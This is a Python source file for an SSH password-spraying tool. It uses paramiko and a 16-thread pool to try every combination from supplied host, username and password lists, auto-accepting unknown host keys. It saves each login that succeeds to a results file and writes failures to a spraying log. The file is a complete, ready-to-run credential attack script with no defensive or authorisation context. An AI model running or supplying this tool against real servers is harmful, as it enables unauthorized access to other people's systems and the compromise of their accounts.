import sys
import paramiko
from concurrent.futures import ThreadPoolExecutor
import datetime

hosts = open(sys.argv[1]).readlines()
usernames = open(sys.argv[2]).readlines()
secrets = open(sys.argv[3]).readlines()

attempts = len(hosts) * len(usernames) * len(secrets)
count = 0
worked = []
threads = []

print(" --> Attempts = ", attempts, " <--")

def sweep(targets, username, password):
    #print("********************")
    print("Starting ",username, password)
    #print("********************")
    for target in targets:
        target = target.strip("\n")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=target, username=username, password=password)
            fl = open("res_f.txt","a")
            fl.write(target + " , " + username + " , " + password +"\n")
            fl.close()
            print("[ %s, %s, %s] ==> worked", target, username, password)
            client.close()
        except Exception as e:
            fl = open("ssh_sprayer2_logs.txt","a")
            fl.write(str(e) + "\n")
            fl.close()
            # print(e)


def main():
    dt = datetime.datetime.now()

    fl = open("ssh_sprayer2_logs.txt", "a")
    fl.write("\n\n" + "=------------>>>>>>New Spraying Logs Started on : "+ str(dt) + "<<<<<<--------------=" + "\n")
    fl.close()
    pool = ThreadPoolExecutor(16)
    for passwd in secrets:
        passwd = passwd.strip("\n")
        for user in usernames:
            user = user.strip("\n")
            t = pool.submit(sweep, hosts, user, passwd)
            threads.append(t)
    for t in threads:
        while not t.done():
            pass

if __name__ == '__main__':
    main()
